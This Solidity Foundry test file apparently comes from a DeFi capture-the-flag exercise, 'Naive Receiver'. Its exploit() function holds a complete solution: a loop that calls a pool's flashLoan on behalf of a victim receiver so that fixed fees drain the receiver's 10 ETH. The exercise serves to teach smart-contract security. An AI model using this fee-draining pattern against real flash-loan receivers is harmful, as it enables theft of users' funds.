// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../../src/naive-receiver/NaiveReceiverLenderPool.sol";
import "../../src/naive-receiver/FlashLoanReceiver.sol";
import "openzeppelin-contracts/interfaces/IERC3156FlashBorrower.sol";

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

contract NaiveReceiverTest is BaseTest {
    // Pool has 1000 ETH in balance
    uint256 ETHER_IN_POOL = 1000 ether;

    // Receiver has 10 ETH in balance
    uint256 ETHER_IN_RECEIVER = 10 ether;

    NaiveReceiverLenderPool pool;
    FlashLoanReceiver receiver;

    address payable attacker;

    constructor() {
        string[] memory labels = new string[](2);
        labels[0] = "Attacker";

        preSetup(2, labels);
    }

    function setUp() public override {
        super.setUp();

        bool sent;

        attacker = users[0];

        // setup contracts
        pool = new NaiveReceiverLenderPool();
        (sent, ) = address(pool).call{value: ETHER_IN_POOL}("");
        require(sent, "ETHER_IN_POOL not sent to pool");

        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(pool.flashFee(pool.ETH(), 0), 1 ether);

        receiver = new FlashLoanReceiver(payable(pool));
        (sent, ) = address(receiver).call{value: ETHER_IN_RECEIVER}("");
        require(sent, "ETHER_IN_RECEIVER not sent to receiver");

        assertEq(address(receiver).balance, ETHER_IN_RECEIVER);
    }

    function test_ExploitNaiveReceiver() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */

        // Just execute  function several times with special amount.

        vm.startPrank(attacker);

        uint256 balanceDivFee = (address(receiver).balance /
            pool.flashFee(pool.ETH(), 0));

        for (uint256 i; i < balanceDivFee; ++i) {
            pool.flashLoan(
                IERC3156FlashBorrower(receiver),
                pool.ETH(),
                (address(receiver).balance - pool.flashFee(pool.ETH(), 0)),
                "0x"
            );
        }
        vm.stopPrank();
    }

    function success() internal override {
        // All ETH has been drained from the receiver
        assertEq(address(receiver).balance, 0);
        assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
    }
}
